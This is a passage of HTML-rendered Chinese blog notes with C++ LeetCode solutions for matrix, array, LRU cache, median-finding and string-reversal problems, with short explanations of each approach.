class="number">0</span>;k&lt;vec.<span class="built_in">size</span>();k++)&#123;</span><br><span class="line">            <span class="keyword">int</span> hang = vec[k].first;<span class="comment">//行下标</span></span><br><span class="line">            <span class="keyword">int</span> lie = vec[k].second;<span class="comment">//列下标</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;   </span><br><span class="line">                matrix[hang][i] = <span class="number">0</span>;<span class="comment">//行置0</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;   </span><br><span class="line">                matrix[j][lie]=<span class="number">0</span>;   <span class="comment">//列置0</span></span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="48-旋转图像"><a href="#48-旋转图像" class="headerlink" title="48 旋转图像"></a>48 旋转图像</h3><p>给定一个 <code>n × n</code> 的二维矩阵 matrix 表示一个图像。请你【将图像顺时针旋转 90 度】。<br>你必须在 原地 旋转图像，这意味着你需要直接修改输入的二维矩阵。请不要 使用另一个矩阵来旋转图像。</p>
<p><strong>分析：</strong><br><strong>对于矩阵中第 i 行的第 j 个元素，在旋转后，它出现在倒数第 i 列的第 j 个位置。</strong><br><img src="https://img-blog.csdnimg.cn/0c45f01df1944b1fb390bde5b4be7024.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//O(n^2) O(n^2)</span></span><br><span class="line"><span class="comment">//matrix_new[j][n-i-1] = matrix[i][j];</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = matrix.<span class="built_in">size</span>();<span class="comment">//本题 n*n</span></span><br><span class="line">        <span class="keyword">auto</span> matrix_new = matrix;<span class="comment">//值拷贝</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                matrix_new[j][n-i<span class="number">-1</span>] = matrix[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        matrix = matrix_new;<span class="comment">//值拷贝</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先以 中间行 为对称轴 上下交换</span></span><br><span class="line"><span class="comment">    再以从 左上至右下 的对角线为轴 交换元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=matrix.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">                <span class="built_in">swap</span>(matrix[i][j],matrix[n-i<span class="number">-1</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="built_in">swap</span>(matrix[i][j],matrix[j][i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="240-搜索二维矩阵-II"><a href="#240-搜索二维矩阵-II" class="headerlink" title="240 搜索二维矩阵 II"></a>240 搜索二维矩阵 II</h3><p>编写一个高效的算法来搜索 m x n 矩阵 matrix 中的一个目标值 target 。该矩阵具有以下<code>特性</code>：</p>
<pre><code>每行的元素从左到右升序排列。
每列的元素从上到下升序排列。
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    lower_bound()针对已经升序排序的【二分查找】，某元素是否存在，返回其iterator</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">searchMatrix</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//row 是一个vector&lt;int&gt;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; row: matrix) &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(row.<span class="built_in">begin</span>(), row.<span class="built_in">end</span>(), target);</span><br><span class="line">            <span class="keyword">if</span> (it != row.<span class="built_in">end</span>() &amp;&amp; *it == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针 最简便的！！！！</span></span><br><span class="line"><span class="comment">    O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">searchMatrix</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.<span class="built_in">size</span>();      <span class="comment">//行</span></span><br><span class="line">        <span class="keyword">int</span> n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();   <span class="comment">//列</span></span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>, y = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(x&lt;m &amp;&amp; y&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[x][y]==target)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(matrix[x][y] &gt; target)</span><br><span class="line">                y--;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                x++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="41-缺失的第一个正数"><a href="#41-缺失的第一个正数" class="headerlink" title="41 缺失的第一个正数"></a>41 缺失的第一个正数</h2><p>给你一个【未排序】的整数数组 nums ，请你找出其中【没有出现】的【最小的正整数】。<br>请你实现时间复杂度为 O(n) 并且只使用常数级别额外空间的解决方案。<br><img src="https://img-blog.csdnimg.cn/daa37d810cde4a4f896f12d4dcd967eb.png"></p>
<p><strong>分析：</strong><br>对于一个长度为 N 的数组，其中没有出现的最小正整数只能在 [1,N+1] 中。这是因为如果 [1,N] 都出现了，那么答案是 N+1，否则答案是 [1,N] 中没有出现的最小正整数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstMissingPositive</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[i]&gt;=<span class="number">1</span> &amp;&amp; nums[i]&lt;=n &amp;&amp; nums[i]!=nums[nums[i]<span class="number">-1</span>])</span><br><span class="line">                <span class="built_in">swap</span>(nums[i],nums[nums[i]<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(nums[i]!=i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="146-LRU-缓存"><a href="#146-LRU-缓存" class="headerlink" title="146 LRU 缓存"></a>146 LRU 缓存</h3><p>请你设计并实现一个满足  LRU (最近最少使用) 缓存 约束的数据结构。<br>实现 LRUCache 类：</p>
<pre><code>LRUCache(int capacity) 以 正整数 作为容量 capacity 初始化 LRU 缓存
int get(int key) 如果关键字 key 存在于缓存中，则返回关键字的值，否则返回 -1 。
void put(int key, int value) 如果关键字 key 已经存在，则变更其数据值 value ；如果不存在，则向缓存中插入该组 key-value 。如果插入操作导致关键字数量超过 capacity ，则应该 逐出 最久未使用的关键字。
</code></pre>
<p>函数 get 和 put 必须以 O(1) 的平均时间复杂度运行。<br><img src="https://img-blog.csdnimg.cn/a24fc0c46ba14ee894728b06ba9a2422.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表+双向链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">        <span class="keyword">int</span> key,val;</span><br><span class="line">        Node *left,*right;</span><br><span class="line">        <span class="built_in">Node</span>():<span class="built_in">key</span>(<span class="number">0</span>),<span class="built_in">val</span>(<span class="number">0</span>),<span class="built_in">left</span>(<span class="literal">NULL</span>),<span class="built_in">right</span>(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">        <span class="built_in">Node</span>(<span class="keyword">int</span> _key,<span class="keyword">int</span> _val):<span class="built_in">key</span>(_key),<span class="built_in">val</span>(_val),<span class="built_in">left</span>(<span class="literal">NULL</span>),<span class="built_in">right</span>(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>,Node*&gt; cache;</span><br><span class="line">    Node *head;</span><br><span class="line">    Node *tail;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> capacity;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">//head后插入p（头插法）</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insertNode</span><span class="params">(Node *p)</span></span>&#123;</span><br><span class="line">        p-&gt;right = head-&gt;right;</span><br><span class="line">        head-&gt;right = p;</span><br><span class="line">        p-&gt;left = head;</span><br><span class="line">        p-&gt;right-&gt;left = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除p</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(Node *p)</span></span>&#123;</span><br><span class="line">        p-&gt;left-&gt;right = p-&gt;right;</span><br><span class="line">        p-&gt;right-&gt;left = p-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将结点转移到 链表 头部，即head-&gt;next</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveToHead</span><span class="params">(Node *node)</span></span>&#123;</span><br><span class="line">        <span class="built_in">deleteNode</span>(node);</span><br><span class="line">        <span class="built_in">insertNode</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">LRUCache</span>(<span class="keyword">int</span> _capacity):<span class="built_in">capacity</span>(_capacity),<span class="built_in">size</span>(<span class="number">0</span>) &#123;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="built_in">Node</span>();<span class="comment">//伪头部——则真正有 数据的头结点是 head-&gt;right</span></span><br><span class="line">        tail = <span class="keyword">new</span> <span class="built_in">Node</span>();<span class="comment">//伪尾部——则真正有 数据的尾结点是 tail-&gt;left</span></span><br><span class="line">        head-&gt;right = tail;</span><br><span class="line">        tail-&gt;left = head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除最后一个结点</span></span><br><span class="line">    <span class="function">Node* <span class="title">removeTail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Node *node = tail-&gt;left;<span class="comment">//删去最后一个结点</span></span><br><span class="line">        <span class="built_in">deleteNode</span>(node);</span><br><span class="line">        <span class="keyword">return</span> node;<span class="comment">//返回被删结点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!cache.<span class="built_in">count</span>(key))<span class="comment">//没找到，返回-1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//key存在，查 hash</span></span><br><span class="line">        Node *node = cache[key];</span><br><span class="line">        <span class="built_in">moveToHead</span>(node);<span class="comment">//将结点转移至头部（最近访问过），排在链表越后面，越久未访问，则可以用于置换更新</span></span><br><span class="line">        <span class="keyword">return</span> node-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!cache.<span class="built_in">count</span>(key))&#123;<span class="comment">//不存在</span></span><br><span class="line">            <span class="comment">//创建新结点 存入 哈希表</span></span><br><span class="line">            Node *node = <span class="keyword">new</span> <span class="built_in">Node</span>(key,value);</span><br><span class="line">            cache[key] = node;</span><br><span class="line">            <span class="comment">//添加到双向链表头部</span></span><br><span class="line">            <span class="built_in">insertNode</span>(node);</span><br><span class="line">            size++;</span><br><span class="line">            <span class="keyword">if</span>(size&gt;capacity)&#123;<span class="comment">//容量超出</span></span><br><span class="line">                Node *del_node = <span class="built_in">removeTail</span>();<span class="comment">//被删结点</span></span><br><span class="line">                <span class="comment">//同时删去哈希表中 对应项</span></span><br><span class="line">                cache.<span class="built_in">erase</span>(del_node-&gt;key);</span><br><span class="line">                <span class="comment">//防止内存泄漏</span></span><br><span class="line">                <span class="keyword">delete</span> del_node;</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//已经存在，则需要更新 val</span></span><br><span class="line">            Node *node = cache[key];</span><br><span class="line">            <span class="comment">//不更新 哈希表吗？？？？？？？？？？？</span></span><br><span class="line">            node-&gt;val = value;</span><br><span class="line">            <span class="built_in">moveToHead</span>(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="287-寻找重复数"><a href="#287-寻找重复数" class="headerlink" title="287 寻找重复数"></a>287 寻找重复数</h3><p>给定一个包含 n + 1 个整数的数组 nums ，其数字都在 [1, n] 范围内（包括 1 和 n），可知至少存在一个重复的整数。<br>假设 nums 只有 一个重复的整数 ，返回 这个重复的数 。<br>你设计的解决方案必须 <strong>不修改 数组 nums</strong> 且<strong>只用常量级 O(1) 的额外空间</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//哈希表 但是使用了额外空间</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> num:nums)&#123;</span><br><span class="line">            maap[num]++;</span><br><span class="line">            <span class="keyword">if</span>(maap[num]&gt;=<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//快慢指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>, fast = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[nums[fast]];</span><br><span class="line">        &#125;<span class="keyword">while</span>(slow!=fast);</span><br><span class="line">        slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(slow!=fast)&#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[fast];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4 寻找两个正序数组的中位数"></a>4 寻找两个正序数组的中位数</h3><p>给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。<br>**算法的时间复杂度应该为 O(log (m+n))**。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//O(m+n) 我没优化，以后再说吧</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>(), n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nums</span><span class="params">(m+n)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> nums2;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> nums1;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;m &amp;&amp; j&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums1[i]&lt;=nums2[j])&#123;</span><br><span class="line">                nums[k++] = nums1[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                nums[k++] = nums2[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;m)&#123;</span><br><span class="line">            nums[k++]=nums1[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;n)&#123;</span><br><span class="line">            nums[k++]=nums2[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; nums;</span><br><span class="line">        nums = <span class="built_in">merge</span>(nums1,nums2);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">            cout &lt;&lt; nums[i];</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">        <span class="comment">//if(nums.size()==1)</span></span><br><span class="line">        <span class="keyword">int</span> x = (m+n);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;x=&quot;</span>&lt;&lt;x/<span class="number">2</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">double</span> res;</span><br><span class="line">        <span class="keyword">if</span>(x%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">            res = nums[x/<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">            res = (nums[x/<span class="number">2</span>]+nums[x/<span class="number">2</span><span class="number">-1</span>])/<span class="number">2.0</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>五、字符串</title>
    <url>/2025/12/03/%E4%BA%94%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="五、字符串"><a href="#五、字符串" class="headerlink" title="五、字符串"></a>五、字符串</h2><h3 id="415-字符串相加"><a href="#415-字符串相加" class="headerlink" title="415 字符串相加"></a>415 字符串相加</h3><p>给定【两个字符串形式】的【非负整数】 num1 和num2 ，计算它们的和并同样【以字符串形式返回】。<br>你不能使用任何內建的用于处理大整数的库（比如 BigInteger）， 也不能直接将输入的字符串转换为整数形式。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">addStrings</span><span class="params">(string num1, string num2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=num1.<span class="built_in">size</span>()<span class="number">-1</span>,j=num2.<span class="built_in">size</span>()<span class="number">-1</span>,add=<span class="number">0</span>;</span><br><span class="line">        string ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> || j&gt;=<span class="number">0</span> || add!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = i&gt;=<span class="number">0</span> ? num1[i] - <span class="string">&#x27;0&#x27;</span> : <span class="number">0</span>;<span class="comment">//加0和减0 是为了间接将 字符转为整数进行运算</span></span><br><span class="line">            <span class="keyword">int</span> y = j&gt;=<span class="number">0</span> ? num2[j] - <span class="string">&#x27;0&#x27;</span> : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> res = x+y+add;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(<span class="string">&#x27;0&#x27;</span> + res%<span class="number">10</span>);<span class="comment">//余数</span></span><br><span class="line">            add = res/<span class="number">10</span>;  <span class="comment">//商，进位</span></span><br><span class="line">            i -= <span class="number">1</span>;</span><br><span class="line">            j -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(ans.<span class="built_in">begin</span>(),ans.<span class="built_in">end</span>());<span class="comment">//字符串反转</span></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344 反转字符串"></a>344 反转字符串</h3><p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 s 的形式给出。<br>不要给另外的数组分配额外的空间，你必须<strong>原地修改</strong>输入数组、使用 O(1) 的额外空间解决这一问题。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针 swap()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(vector&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len=s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=len<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=j)&#123;<span class="comment">//i&lt;j也可&gt;</span></span><br><span class="line">            <span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="541-反转字符串-II——每2k字符，反转前k个字符"><a href="#541-反转字符串-II——每2k字符，反转前k个字符" class="headerlink" title="541 反转字符串 II——每2k字符，反转前k个字符"></a>541 反转字符串 II——每2k字符，反转前k个字符</h3><p>给定一个字符串 s 和一个整数 k，从字符串开头算起，每计数至 2k 个字符，就【反转这 2k 字符中的前 k 个字符】。</p>
<ul>
<li>如果剩余字符少于 k 个，则将剩余字符全部反转。</li>
<li>如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    模拟：反转每个下标从 2k 的倍数开始的，长度为 k 的子串。若【子串长度不足 k，则反转整个子串】</span></span><br><span class="line"><span class="comment">    min(i+k-1,n-1)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseS</span><span class="params">(string &amp;s,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i+=<span class="number">2</span>*k)&#123;</span><br><span class="line">            <span class="built_in">reverseS</span>(s,i,<span class="built_in">min</span>(i+k<span class="number">-1</span>,n<span class="number">-1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
